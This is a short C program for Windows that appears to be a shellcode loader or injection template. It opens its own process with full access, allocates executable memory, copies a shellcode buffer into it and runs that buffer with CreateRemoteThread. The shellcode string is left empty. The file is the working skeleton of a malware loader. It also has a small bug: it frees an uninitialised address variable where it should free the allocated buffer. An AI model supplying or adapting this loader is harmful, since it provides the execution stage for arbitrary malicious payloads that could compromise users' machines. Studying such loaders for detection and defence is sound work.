//
// Created by dev on 10/13/25.
//

#include <windows.h>

int main () {
    unsigned char shellcode[] =
        "";

    HANDLE procHandle;
    HANDLE procAddr;
    PVOID procBuff;

    DWORD pnameid = GetCurrentProcessId();
    procHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pnameid);

    procBuff = VirtualAllocEx(procHandle, NULL, sizeof shellcode, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(procHandle, procBuff, shellcode, sizeof shellcode, NULL);
    HANDLE procThread = CreateRemoteThread(procHandle, NULL, 0, (LPTHREAD_START_ROUTINE)procBuff, NULL, 0, NULL);

    WaitForSingleObject(procThread, INFINITE);

    VirtualFreeEx(procHandle, procAddr, sizeof shellcode, MEM_RELEASE);
    CloseHandle(procHandle);

    return 0;
}